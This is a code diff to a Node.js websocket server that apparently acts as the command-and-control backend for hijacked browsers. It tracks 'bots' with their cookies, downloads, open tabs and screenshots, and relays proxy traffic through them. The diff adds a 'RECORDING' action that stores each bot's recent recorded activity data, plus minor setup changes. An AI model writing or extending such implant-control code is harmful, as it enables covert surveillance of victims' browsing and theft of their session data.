@@ -1,3 +1,5 @@
+require("dotenv").config();
+
 const NodeCache = require("node-cache");
 const AnyProxy = require("./anyproxy");
 const cluster = require("cluster");
@@ -6,7 +8,6 @@ const https = require("https");
 const redis = require("redis");
 const uuid = require("uuid");
 const util = require("util");
-const fs = require("fs");
 
 const database = require("./database.js");
 const database_init = database.database_init;
@@ -16,6 +17,7 @@ const sequelize = database.sequelize;
 const Sequelize = require("sequelize");
 const { log } = require("async");
 const Op = Sequelize.Op;
+
 
 const get_secure_random_string = require("./utils.js").get_secure_random_string;
 const logit = require("./utils.js").logit;
@@ -89,6 +91,19 @@ async function ping(websocket_connection, params) {
     is_online: true,
     current_tab: params.current_tab,
     current_tab_image: params.current_tab_image,
+  });
+}
+
+
+async function recording(websocket_connection, params) {
+  const bot = await pong_and_get_bot(websocket_connection);
+  console.log(params.length);
+  const last_recording = bot.recording.slice(-100);
+  last_recording.push({ data: params, date: new Date().getTime() });
+
+  await bot.update({
+    is_online: true,
+    recording: last_recording,
   });
 }
 
@@ -523,6 +538,7 @@ async function initialize_new_browser_connection(ws) {
       bookmarks: [],
       cookies: [],
       downloads: [],
+      recording: [],
       switch_config: BOT_DEFAULT_SWITCH_CONFIG,
       state: "",
     });
@@ -693,6 +709,8 @@ async function initialize() {
         state(ws, inbound_message.data);
       } else if (inbound_message.action === "REALTIME_IMG") {
         real_time_img(ws, inbound_message.data);
+      } else if (inbound_message.action === "RECORDING") {
+        recording(ws, inbound_message.data);
       } else if (ws.browser_id) {
         // Write to redis proxy topic with the response from the
         // websocket connection.
@@ -753,7 +771,7 @@ async function initialize() {
 
     logit(`Initializing the database connection...`);
     await database_init();
-
+    logit(`Database initialize finished...`);
     // Fork workers.
     for (let i = 0; i < numCPUs; i++) {
       cluster.fork();
